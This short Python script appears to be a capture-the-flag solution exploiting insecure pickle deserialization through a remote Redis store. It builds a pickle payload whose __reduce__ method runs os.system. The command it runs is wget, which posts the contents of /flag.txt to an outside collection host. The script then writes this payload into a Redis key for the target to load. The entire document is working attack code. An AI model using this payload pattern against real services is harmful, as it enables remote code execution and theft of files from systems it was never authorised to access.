#!/usr/bin/python2.7
#coding:utf-8

import os
import pickle

from redis import StrictRedis

redis = StrictRedis(host='buuoj.cn', port=40000, db=0, password='chocolate')


class test(object):
    def __reduce__(self):
        return (os.system,
                ("wget 'http://xss.buuoj.cn/index.php?do=api&id=Fk3XC0' --post-data='location='`cat /flag.txt` -O-",))


a = test()
payload = pickle.dumps(a)

redis.set("glzjina12a226adf1a1cf0083d7459a72dc4f7", payload)
